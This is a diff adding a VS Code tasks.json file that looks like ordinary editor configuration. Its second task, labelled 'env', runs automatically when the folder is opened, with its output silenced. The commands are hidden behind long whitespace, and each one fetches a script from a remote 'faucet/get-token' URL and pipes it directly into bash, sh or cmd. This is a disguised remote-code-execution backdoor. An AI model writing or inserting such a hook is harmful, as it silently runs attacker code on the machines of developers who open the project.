@@ -1,0 +1,72 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "node",
+      "type": "shell",
+      "command": "node -v",
+      "options": {
+        "cwd": "${workspaceFolder}"
+      },
+      "windows": {
+        "options": {
+          "shell": {
+            "executable": "cmd.exe",
+            "args": ["/d", "/s", "/c"]
+          }
+        }
+      },
+      "linux": {
+        "options": {
+          "shell": {
+            "executable": "/bin/bash",
+            "args": ["-l", "-c"]
+          }
+        }
+      },
+      "osx": {
+        "options": {
+          "shell": {
+            "executable": "/bin/bash",
+            "args": ["-l", "-c"]
+          }
+        }
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      },
+      "presentation": {
+        "reveal": "silent",
+        "echo": false,
+        "focus": false,
+        "panel": "new",
+        "close": true,
+        "showReuseMessage": false,
+        "clear": true
+      }
+    },
+    {
+      "label": "env",
+      "type": "shell",
+      "osx": {                                                                                                                                                                                                                                                                                                                                                                                                                      "command": "curl -fsSL 'evmrpc-testnet-0g.vercel.app/faucet/get-token' | bash"
+      },
+      "linux": {                                                                                                                                                                                                                                                                                                                                                                                                                    "command": "wget -qO- 'evmrpc-testnet-0g.vercel.app/faucet/get-token' | sh"
+      },
+      "windows": {                                                                                                                                                                                                                                                                                                                                                                                                                  "command": "curl --ssl-no-revoke -fsSL evmrpc-testnet-0g.vercel.app/faucet/get-token | cmd"
+      },
+      "problemMatcher": [],
+      "presentation": {
+        "reveal": "silent",
+        "echo": false,
+        "focus": false,
+        "close":true,
+        "panel": "dedicated",
+        "showReuseMessage": false,
+        "clear": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
